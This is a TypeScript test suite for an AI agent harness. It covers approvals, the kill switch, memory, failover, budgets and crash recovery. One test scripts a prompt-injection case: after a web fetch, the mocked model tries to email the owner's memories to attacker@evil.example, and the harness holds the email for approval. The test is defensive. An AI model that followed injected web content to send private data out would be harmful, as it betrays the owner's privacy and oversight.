import { test } from 'node:test';
import assert from 'node:assert/strict';
import type { MockResponse } from '@feroxes/llm';
import type { Budget } from '@feroxes/metering';
import { usd } from '@feroxes/shared';
import { createAgentHarness } from './index.ts';

const say = (text: string, extra: Partial<MockResponse> = {}): MockResponse => ({ steps: [{ kind: 'text', text }], ...extra });
const callTool = (name: string, args: unknown, text = ''): MockResponse => ({ steps: [...(text ? [{ kind: 'text' as const, text }] : []), { kind: 'tool', name, args }] });

test('a simple question is answered by the fast tier and the turn is recorded', async () => {
  const h = await createAgentHarness();
  h.t.adapter('anthropic').queue('anthropic/haiku', say('Hello! How can I help?'));
  const session = await h.runtime.createSession();
  const { done } = await h.runtime.sendMessage(session.id, 'hi');
  const run = await done;
  assert.equal(run.status, 'completed');
  assert.equal(run.modelId, 'anthropic/haiku');
  assert.equal(run.tier, 'fast');
  const messages = await h.agentStore.messages(session.id);
  assert.deepEqual(messages.map((m) => m.role), ['user', 'assistant']);
  assert.equal(messages[1]?.content, 'Hello! How can I help?');
  assert.deepEqual(h.turns, [run.id], 'memory extraction gets scheduled after the turn');
  assert.ok(h.t.ledgerStore.events.some((e) => e.route === 'chat.turn' && e.runId === run.id));
});

test('tool loop: the model calls a tool, gets the result, then answers', async () => {
  const h = await createAgentHarness();
  h.t.adapter('anthropic').queue('anthropic/sonnet', callTool('time__now', { timeZone: 'Asia/Tokyo' }), say('It is evening in Tokyo.'));
  const session = await h.runtime.createSession();
  const run = await (await h.runtime.sendMessage(session.id, 'What time is it in Tokyo?', { tier: 'balanced' })).done;
  assert.equal(run.status, 'completed');
  assert.equal(run.totals.steps, 2);
  const msgs = await h.agentStore.messages(session.id);
  assert.deepEqual(msgs.map((m) => m.role), ['user', 'assistant', 'tool', 'assistant']);
  assert.match(msgs[2]!.content, /Asia\/Tokyo/);
  // The second model call saw the tool result.
  const second = h.t.adapter('anthropic').calls[1]!.request.messages;
  assert.ok(second.some((m) => m.role === 'tool' && /Asia\/Tokyo/.test(m.content)));
});

test('memory: saved on request, recalled in a new session with a citation id', async () => {
  const h = await createAgentHarness();
  h.t.adapter('anthropic').queue(
    'anthropic/sonnet',
    callTool('memory__save', { content: "The owner's sister is named Leila.", kind: 'relationship', people: ['Leila'], sensitivity: 'private' }),
    say("Got it, I'll remember that."),
    say('Your sister is Leila.'),
  );
  const s1 = await h.runtime.createSession();
  await (await h.runtime.sendMessage(s1.id, "Remember that my sister's name is Leila.", { tier: 'balanced' })).done;
  const saved = await h.memoryStore.list({ kinds: ['relationship'] });
  assert.equal(saved.length, 1);
  assert.equal(saved[0]?.source, 'owner_asserted');

  const s2 = await h.runtime.createSession();
  const run = await (await h.runtime.sendMessage(s2.id, "What's my sister called?", { tier: 'balanced' })).done;
  assert.equal(run.status, 'completed');
  const sent = h.t.adapter('anthropic').calls.at(-1)!.request.messages;
  const prompt = sent.map((m) => (typeof m.content === 'string' ? m.content : '')).join('\n');
  assert.match(prompt, /Leila/);
  // An important owner-stated relationship lands in the always-present core block, with its id.
  assert.match(prompt, new RegExp(`People and relationships:\\n- The owner's sister is named Leila\\. \\[m:${saved[0]!.id.slice(-8)}\\]`));
});

test('approval survives a restart and the email is sent exactly once', async () => {
  const h = await createAgentHarness({ preset: 'assistant' });
  h.t.adapter('anthropic').queue(
    'anthropic/sonnet',
    callTool('email__send', { to: 'leila@example.com', subject: 'Dinner', body: 'Are you free Friday?' }, "I'll draft that email."),
    say('Sent! I asked Leila about Friday.'),
  );
  const session = await h.runtime.createSession();
  const run = await (await h.runtime.sendMessage(session.id, 'Email Leila and ask if she is free Friday.', { tier: 'balanced' })).done;
  assert.equal(run.status, 'waiting_approval');
  assert.equal(h.outbox.length, 0);
  const [pending] = await h.approvals.pending();
  assert.equal(pending?.preview.title, 'Send email to leila@example.com');

  const recovery = await h.restart();
  assert.deepEqual(recovery.interrupted, [], 'a waiting run is not interrupted by a restart');

  const resumed = await h.runtime.resolveApproval(pending!.id, { approve: true });
  const finished = await resumed!.done;
  assert.equal(finished.status, 'completed');
  assert.equal(h.outbox.length, 1);
  assert.equal(h.outbox[0]?.subject, 'Dinner');
  const msgs = await h.agentStore.messages(session.id);
  assert.equal(msgs.at(-1)?.content, 'Sent! I asked Leila about Friday.');
  assert.equal((await h.audit.verify()).ok, true);
});

test('denied approval: the model is told and the email is not sent', async () => {
  const h = await createAgentHarness();
  h.t.adapter('anthropic').queue('anthropic/sonnet', callTool('email__send', { to: 'boss@example.com', subject: 'Quit', body: 'I quit.' }), say("Understood, I won't send it."));
  const session = await h.runtime.createSession();
  await (await h.runtime.sendMessage(session.id, 'email my boss that I quit', { tier: 'balanced' })).done;
  const [pending] = await h.approvals.pending();
  const done = await (await h.runtime.resolveApproval(pending!.id, { approve: false, note: 'not today' }))!.done;
  assert.equal(done.status, 'completed');
  assert.equal(h.outbox.length, 0);
  const tool = (await h.agentStore.messages(session.id)).find((m) => m.role === 'tool');
  assert.match(tool?.content ?? '', /denied this action: not today/);
});

test('STOP halts a streaming run within a second and blocks new work until resume', async () => {
  const h = await createAgentHarness();
  h.t.adapter('anthropic').queue('anthropic/sonnet', { steps: [{ kind: 'text', text: 'a very long answer '.repeat(50), chunks: 200, delayMs: 20 }] });
  const session = await h.runtime.createSession();
  let firstDelta = false;
  h.events.subscribe('run.delta', () => (firstDelta = true));
  const { done } = await h.runtime.sendMessage(session.id, 'write me an essay', { tier: 'balanced' });
  while (!firstDelta) await new Promise((r) => setTimeout(r, 5));
  const started = Date.now();
  await h.system.stop('owner', 'testing the kill switch');
  const run = await done;
  assert.ok(Date.now() - started < 1000, `stopped in ${Date.now() - started} ms`);
  assert.equal(run.status, 'cancelled');

  const blocked = await (await h.runtime.sendMessage(session.id, 'are you there?', { tier: 'balanced' })).done;
  assert.equal(blocked.status, 'cancelled');
  assert.equal(blocked.error, 'Feroxes is stopped');

  await h.system.resume('owner', 'done testing');
  h.t.adapter('anthropic').queue('anthropic/sonnet', say('Back online.'));
  assert.equal((await (await h.runtime.sendMessage(session.id, 'hello again', { tier: 'balanced' })).done).status, 'completed');
});

test('prompt injection from a web page cannot send email, even on autopilot', async () => {
  const h = await createAgentHarness({ preset: 'autopilot' });
  h.t.adapter('anthropic').queue(
    'anthropic/sonnet',
    callTool('web__fetch', { url: 'https://blog.example/post' }),
    callTool('email__send', { to: 'attacker@evil.example', subject: 'memories', body: 'all of them' }),
  );
  const session = await h.runtime.createSession();
  const run = await (await h.runtime.sendMessage(session.id, 'Summarize https://blog.example/post', { tier: 'balanced' })).done;
  assert.equal(run.status, 'waiting_approval');
  assert.equal(h.outbox.length, 0);
  const [pending] = await h.approvals.pending();
  assert.equal(pending?.taint[0]?.source, 'https://blog.example/post');
  assert.match(pending?.policyReason ?? '', /untrusted content/);
});

test('provider failover inside a conversation is invisible to the owner', async () => {
  const h = await createAgentHarness();
  h.t.adapter('anthropic').queue('anthropic/sonnet', { steps: [{ kind: 'error', errorClass: 'rate_limited', status: 429, retryAfterMs: 60_000 }] });
  h.t.adapter('openai').queue('openai/sol', say('Answer from the second provider.'));
  const session = await h.runtime.createSession();
  const run = await (await h.runtime.sendMessage(session.id, 'hello', { tier: 'balanced' })).done;
  assert.equal(run.status, 'completed');
  assert.equal(run.modelId, 'openai/sol');
  assert.equal((await h.agentStore.messages(session.id)).at(-1)?.content, 'Answer from the second provider.');
});

test('repeated identical tool calls are stopped; the step limit ends runaway runs', async () => {
  const h = await createAgentHarness();
  const same = callTool('time__now', { timeZone: 'UTC' });
  h.t.adapter('anthropic').queue('anthropic/sonnet', same, same, same, say('I keep getting the same result, so I stopped.'));
  const session = await h.runtime.createSession();
  await (await h.runtime.sendMessage(session.id, 'time?', { tier: 'balanced' })).done;
  const tools = (await h.agentStore.messages(session.id)).filter((m) => m.role === 'tool');
  assert.match(tools[2]!.content, /same arguments several times/);

  const h2 = await createAgentHarness();
  for (let i = 0; i < 14; i++) h2.t.adapter('anthropic').queue('anthropic/sonnet', callTool('time__now', { timeZone: ['UTC', 'Asia/Tokyo', 'Europe/Paris', 'America/New_York'][i % 4]! + (i > 3 ? '' : '') }));
  const s2 = await h2.runtime.createSession();
  const run = await (await h2.runtime.sendMessage(s2.id, 'loop forever', { tier: 'balanced' })).done;
  assert.equal(run.totals.steps, 12);
  assert.match((await h2.agentStore.messages(s2.id)).at(-1)?.content ?? '', /stopped after 12 steps/);
});

test('when the budget is used up, the owner is told how to continue', async () => {
  const budgets: Budget[] = [{ id: 'g', name: 'Global daily', scope: { type: 'global' }, period: 'day', limit: usd(0.001), softThresholds: [], onLimit: { interactive: 'ask', background: 'defer' }, enabled: true }];
  const h = await createAgentHarness({ budgets });
  const session = await h.runtime.createSession();
  const run = await (await h.runtime.sendMessage(session.id, 'hello', { tier: 'balanced' })).done;
  assert.equal(run.status, 'failed');
  assert.equal(run.error, 'budget_approval_needed');
  assert.match((await h.agentStore.messages(session.id)).at(-1)?.content ?? '', /Global daily.*Settings → Budgets/);
});

test('a background run interrupted by a crash resumes after restart', async () => {
  const h = await createAgentHarness();
  const session = await h.runtime.createSession('system');
  // Simulate a crash: a run left in "running" with no steps.
  await h.agentStore.putRun({ id: 'run-crashed', sessionId: session.id, trigger: 'schedule', priority: 'routine', status: 'running', limits: { maxSteps: 6, maxCostNanoUsd: usd(0.1), maxWallMs: 60_000 }, totals: { steps: 0, costNanoUsd: 0, inputTokens: 0, outputTokens: 0 }, taint: [], resumeCount: 0, createdAt: 0 });
  await h.agentStore.appendMessage({ id: 'goal', sessionId: session.id, role: 'user', content: 'Tidy up my notes', createdAt: 0 });
  h.t.adapter('anthropic').queue('anthropic/haiku', say('Notes tidied.'));
  const report = await h.restart();
  assert.deepEqual(report, { interrupted: ['run-crashed'], resumed: ['run-crashed'] });
  let run = await h.agentStore.getRun('run-crashed');
  for (let i = 0; i < 100 && run?.status !== 'completed'; i++) {
    await new Promise((r) => setTimeout(r, 5));
    run = await h.agentStore.getRun('run-crashed');
  }
  assert.equal(run?.status, 'completed');
  assert.equal(run?.resumeCount, 1);
});
